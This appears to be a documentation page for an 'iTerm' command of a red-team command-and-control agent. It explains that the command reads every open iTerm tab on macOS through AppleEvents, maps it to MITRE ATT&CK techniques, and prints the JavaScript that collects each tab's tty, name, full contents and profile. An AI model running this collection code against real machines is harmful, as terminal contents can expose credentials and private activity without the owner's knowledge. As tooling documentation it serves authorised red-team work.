+++
title = "iTerm"
chapter = false
weight = 100
hidden = false
+++

## Summary

Read the contents of all open iTerm tabs if iTerms is open, otherwise just inform the operator that it's not currently running 
- Needs Admin: False  
- Version: 1  
- Author: @its_a_feature_  

### Arguments

## Usage

```
iTerm
```

## MITRE ATT&CK Mapping

- T1139  
- T1056  
## Detailed Summary
This uses AppleEvents to read the contents of iTerm tabs:
```JavaScript
if(term.running()){
    for(let i = 0; i < term.windows.length; i++){
        let window = {};
        for(let j = 0; j < term.windows[i].tabs.length; j++){
            let tab_info = {};
            tab_info['tty'] = term.windows[i].tabs[j].currentSession.tty();
            tab_info['name'] = term.windows[i].tabs[j].currentSession.name();
            tab_info['contents'] = term.windows[i].tabs[j].currentSession.contents();
            tab_info['profileName'] = term.windows[i].tabs[j].currentSession.profileName();
            window["Tab: " + j] = tab_info;
        }
        output["Window: " + i] = window;
    }
}
```
